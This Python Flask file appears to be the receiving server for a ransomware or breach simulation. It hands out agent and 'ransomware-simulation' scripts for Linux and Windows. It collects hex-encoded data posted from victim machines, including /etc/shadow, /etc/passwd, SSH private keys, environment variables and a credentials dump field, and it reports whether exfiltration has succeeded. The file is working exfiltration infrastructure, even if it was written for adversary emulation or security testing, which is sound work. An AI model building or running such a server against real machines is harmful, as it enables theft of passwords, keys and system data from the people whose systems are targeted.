from flask import Flask
from flask import request
import json

db = {}
app = Flask(__name__)


@app.route('/ping')
def index():
    return "pong\n"


def hex_decode(f):
    try:
        return bytes.fromhex(f).decode('utf-8')
    except Exception:
        return ""


@app.route("/agent.sh")
def download_client_sh():
    return open("agent.sh", "r").read()


@app.route("/agent.ps1")
def download_client_ps():
    return open("agent.ps1", "r").read()


@app.route("/ransomware-simulation.sh")
def download_ransomware_simulation_sh():
    return open("ransomware-simulation.sh", "r").read()


@app.route("/ransomware-simulation.ps1")
def download_ransomware_simulation_ps():
    return open("ransomware-simulation.ps1", "r").read()


@app.route("/data/<string:data_id>/ping", methods=["GET"])
def client_status(data_id):
    global db
    db[data_id] = {}
    return "ok"


@app.route("/data/<string:data_id>/exfiltration-status", methods=["GET"])
def client_exfiltration_status(data_id):
    global db
    if data_id in db.keys():
        if len(db[data_id].keys()) != 0:
            return "true"
    return "false"


@app.route("/data/<string:data_id>/status", methods=["GET"])
def client_ping(data_id):
    global db
    if data_id in db.keys():
        return "true"
    else:
        return "false"


@app.route("/data/<string:data_id>/details", methods=["GET"])
def client_details(data_id):
    global db
    if data_id in db.keys():
        return json.dumps(db[data_id])
    else:
        return "{}"


@app.route("/data/<string:data_id>", methods=["GET", "POST"])
def data(data_id):
    global db
    if request.method == "GET":
        return "ok"

    if request.method == "POST":
        results = {}

        data = request.values
        # Linux / macOS parameters
        if "files_etc_passwd" in data:
            results["files_etc_passwd"] = data["files_etc_passwd"]
        if "files_etc_shadow" in data:
            results["files_etc_shadow"] = data["files_etc_shadow"]
        if "files_etc_issue" in data:
            results["files_etc_issue"] = data["files_etc_issue"]
        if "home_ssh_id_rsa" in data:
            results["home_ssh_id_rsa"] = data["home_ssh_id_rsa"]
        if "home_ssh_id_rsa_pub" in data:
            results["home_ssh_id_rsa_pub"] = data["home_ssh_id_rsa_pub"]
        if "home_ssh_authorized_keys" in data:
            results["home_ssh_authorized_keys"] = data["home_ssh_authorized_keys"]
        if "bashrc" in data:
            results["bashrc"] = data["bashrc"]
        if "ifconfig" in data:
            results["ifconfig"] = data["ifconfig"]
        if "uname" in data:
            results["uname"] = data["uname"]
        if "id_command" in data:
            results["id_command"] = data["id_command"]
        if "user" in data:
            results["user"] = data["user"]
        if "ps_aux" in data:
            results["ps_aux"] = data["ps_aux"]

        # Windows parameters
        if "env" in data:
            results["env"] = data["env"]
        if "Username" in data:
            results["Username"] = data["Username"]
        if "COMPUTERNAME" in data:
            results["COMPUTERNAME"] = data["COMPUTERNAME"]
        if "LOGONSERVER" in data:
            results["LOGONSERVER"] = data["LOGONSERVER"]
        if "USERPROFILE" in data:
            results["USERPROFILE"] = data["USERPROFILE"]
        if "USERDOMAIN" in data:
            results["USERDOMAIN"] = data["USERDOMAIN"]
        if "USERNAME" in data:
            results["USERNAME"] = data["USERNAME"]
        if "Path" in data:
            results["Path"] = data["Path"]
        if "ipconfig" in data:
            results["ipconfig"] = data["ipconfig"]
        if "logged_in_users" in data:
            results["logged_in_users"] = data["logged_in_users"]
        if "running_processes" in data:
            results["running_processes"] = data["running_processes"]
        if "CredsDump" in data:
            results["CredsDump"] = data["CredsDump"]

        results_ = {}
        for k in results.keys():
            decoded_value = hex_decode(results[k])
            if decoded_value != "":
                results_[k] = decoded_value
        results = results_
        del results_
        db[data_id] = results
        return "ok"


if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8040, debug=True)
